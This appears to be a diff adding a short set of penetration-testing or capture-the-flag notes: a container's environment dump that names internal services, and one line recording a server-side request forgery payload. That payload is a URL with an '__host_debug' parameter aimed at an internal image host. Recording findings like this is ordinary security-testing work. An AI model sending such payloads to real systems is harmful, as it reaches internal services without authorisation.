@@ -1,0 +1,16 @@
+Env:
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+HOSTNAME=904f692740a5
+IMG_SERVER=imghost:8080
+OLD_SERVER=oldserver:8000
+LANG=C.UTF-8
+GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568
+PYTHON_VERSION=3.9.16
+PYTHON_PIP_VERSION=22.0.4
+PYTHON_SETUPTOOLS_VERSION=58.1.0
+PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d5cb0afaf23b8520f1bbcfed521017b4a95f5c01/public/get-pip.py
+PYTHON_GET_PIP_SHA256=394be00f13fa1b9aaa47e911bdb59a09c3b2986472130f30aa0bfaf7f3980637
+HOME=/home/user
+WERKZEUG_SERVER_FD=3
+
+79.143.25.24:65137/api/image?img_id=10&__host_debug=imghost:8080/ --> SSRF
